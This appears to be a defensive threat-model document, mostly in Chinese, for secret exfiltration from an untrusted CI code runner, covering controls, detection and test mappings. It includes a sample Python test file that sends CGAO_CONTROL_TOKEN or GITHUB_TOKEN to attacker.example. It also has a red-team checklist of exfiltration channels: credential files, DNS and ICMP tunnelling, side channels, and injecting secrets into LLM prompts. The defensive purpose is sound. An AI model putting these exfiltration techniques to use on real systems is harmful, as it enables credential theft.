# Attack Scenario: Runner Secret Exfiltration

> 对应威胁模型：AS-06（secret 在 Untrusted Code Runner 泄漏）、AS-IM-05（Bot token 泄漏）
> 对应 spec：§6.3、§6.4、§13.1（runner 权限模型）、§13.3（filesystem sandbox）
> 对应 tasklist：T-M0-004、T-M5-004（no-secret test execution）

## 1. 攻击描述

Untrusted Code Runner 执行用户提交的代码（implementation_plan 生成的 patch 验证、test 跑批等）。若 runner 持有任何 secret（GitHub App token、IM webhook secret、artifact write token），恶意代码可：

- 直接读环境变量 / 凭据文件
- 通过 outbound 网络请求外带（DNS over HTTPS、ICMP 隧道、第三方 API）
- 通过 stderr / 文件名 / 退出码侧信道泄漏
- 通过 LLM 调用包装层把 secret 塞进 prompt

## 2. 受影响资产

| 资产 | 损失路径 |
|---|---|
| GitHub App private key | 伪造 CGAO 身份做任意 write |
| CGAO_CONTROL_TOKEN | 提权改 audit_records、绕过 policy |
| Lark / WeCom App secret | 伪造 IM webhook、伪造 bot 发言 |
| Artifact write token | 污染 spec/plan artifact，注入下游 |

## 3. 控制点（CGAO 强制）

引用 spec §13.1（runner 权限模型表）：

| 控制 | 实现 |
|---|---|
| **Trusted Control Runner / Untrusted Code Runner 物理拆分** | GitHub Actions self-hosted runner 双 label，secret 仅注入 trusted label |
| **no-secret test execution profile** | Untrusted Code Runner 启动时清空 `GITHUB_*` / `CGAO_*` / `*_SECRET` 环境变量 |
| **Filesystem sandbox** | Untrusted Code Runner 用 bubblewrap / firejail chroot，禁读 `~/.config/gh`、`~/.aws`、`/etc/secrets` |
| **Network egress allowlist** | 仅允许 `api.github.com`、`github.com`、内部 artifact store；DNS tunneling 阻断 |
| **Artifact token 最小权限** | Untrusted runner 仅获取 `read` scope 的 artifact token，写入由 Trusted Runner 代理 |
| **IM webhook secret 不离开 Trusted Control Runner** | spec §17.4、§17.5（签名验证只在 trusted） |
| **C-IM-04** | Bot token / App secret 不离开 Trusted Control Runner |

## 4. 攻击示例（脱敏）

```python
# Malicious test file committed to PR
import os, urllib.request
token = os.environ.get('CGAO_CONTROL_TOKEN') or os.environ.get('GITHUB_TOKEN')
if token:
    urllib.request.urlopen(
        'https://attacker.example/leak?d=' + token,
        timeout=2
    )
```

**期望被阻止的行为：**

- `CGAO_CONTROL_TOKEN` 在 Untrusted Code Runner 环境中不存在
- `GITHUB_TOKEN`（如必须提供）使用最小权限的临时 installation token，仅 read scope
- Outbound 网络请求被 egress allowlist 拒绝

## 5. 检测与响应

| 检测点 | 实现 |
|---|---|
| Runner 启动 env audit | 启动时 dump env keys（不含值）至 audit_records |
| Egress deny log | firewall / proxy 转发的拒绝日志 |
| Token 异常使用 | GitHub App audit log 监控 |
| Test 异常网络行为 | tcpdump 在 runner 内捕获 |

## 6. 测试任务映射

| Fixture / 测试 | tasklist |
|---|---|
| `tests/fixtures/malicious-repos/exfil-env-var/` | T-M0-004 |
| `tests/fixtures/malicious-repos/exfil-network/` | T-M0-004 |
| `tests/security/runner-no-secret.test.ts` | T-M0-004 / T-M5-004 |
| IM webhook secret leakage（v3 新增） | T-INTAKE-010 |

## 7. 蓝军演练清单

- [ ] env var leak（`process.env.GITHUB_TOKEN`）
- [ ] 凭据文件读取（`~/.config/gh/hosts.yml`）
- [ ] Outbound HTTPS 外带
- [ ] DNS tunneling
- [ ] ICMP 隧道（`ping -p`）
- [ ] 文件名侧信道（创建 `leak_<token>.tmp`）
- [ ] stderr 侧信道
- [ ] 退出码侧信道（exit code 编码 token）
- [ ] LLM prompt 包装层注入（运行时改写 system prompt 加 secret）
